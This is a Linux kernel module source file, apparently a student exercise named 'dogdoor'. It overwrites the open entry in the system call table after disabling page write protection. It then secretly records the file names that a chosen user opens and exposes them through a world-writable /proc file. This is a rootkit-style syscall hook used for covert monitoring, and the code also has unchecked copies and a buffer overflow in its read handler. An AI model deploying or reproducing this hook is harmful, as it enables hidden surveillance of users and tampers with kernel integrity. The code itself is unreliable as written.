#include <linux/syscalls.h>
#include <linux/module.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/uaccess.h>
#include <linux/kallsyms.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <linux/cred.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");

void ** sctable ;
int count = 0;
int specified_Id = 0;
char logfile[10][128];

asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t mode) ; 

asmlinkage int m_sys_open(const char __user * filename, int flags, umode_t mode)
{
	char buf[256];
	char fname[256] ;
	int input_user = current_uid().val;
	int i = 0;
	copy_from_user(fname, filename, 256) ;
	

	/* TODO: */
	if (specified_Id == input_user) {
		if(strcmp(".", fname) != 0){
			if(fname[0] != '/'){
				if(count != 10){
					strncpy(logfile[count], fname, 127);
					count ++;
				}else{
					for(i = 0; i < 9; i++){
						strncpy(logfile[i], logfile[i + 1], 127);
					}
					strncpy(logfile[9], fname, 127);
				}			
			}
		}
	}

	return orig_sys_open(filename, flags, mode) ;
}

static 
int m_open(struct inode *inode, struct file *file) {
	return 0 ;
}

static 
int m_release(struct inode *inode, struct file *file) {
	return 0 ;
}


static
ssize_t m_read(struct file *file, char __user *ubuf, size_t size, loff_t *offset) 
{
	/* TODO: */
	char buf[256] = {'\0'};
	char temp[256] = {'\0'};
	
	ssize_t toread ;
	int k = 0;
	
	if(count == 0){
		sprintf(buf, "there is no log\n");
	}else{	
		for(k = 0; k < count; k++){
			sprintf(temp,"%d. %s\n",  k + 1, logfile[k]);
			strcat(buf, temp);
		}
	}

	toread = strlen(buf) >= *offset + size ? size : strlen(buf) - *offset ;

	if (copy_to_user(ubuf, buf + *offset, toread))
		return -EFAULT ;	

	*offset = *offset + toread ;
	

	return toread ;
}

static 
ssize_t m_write(struct file *file, const char __user *ubuf, size_t size, loff_t *offset) 
{

	return *offset ;
}

static const struct file_operations m_fops = {
	.owner = 	THIS_MODULE,
	.open = 	m_open,
	.read = 	m_read,
	.write = 	m_write,
	.llseek = 	seq_lseek,
	.release = 	m_release,
} ;

static 
int __init m_init(void) {
	unsigned int level;
	pte_t* pte;
	proc_create("dogdoor", S_IRUGO | S_IWUGO, NULL, &m_fops) ;

	sctable = (void *) kallsyms_lookup_name("sys_call_table") ;

	orig_sys_open = sctable[__NR_open];
	pte = lookup_address((unsigned long) sctable, &level);
	if(pte->pte &~ _PAGE_RW)
		pte->pte |= _PAGE_RW;
	sctable[__NR_open] = m_sys_open;
	
	printk("current_user_ Id: %d\n", current_uid().val);

	return 0;
}

static 
void __exit m_exit(void) {
	unsigned int level;
	pte_t* pte;
	remove_proc_entry("dogdoor", NULL) ;

	sctable[__NR_open] = orig_sys_open;
	pte = lookup_address((unsigned long) sctable, &level);
	pte->pte = pte->pte &~ _PAGE_RW;
}

module_init(m_init);
module_exit(m_exit);
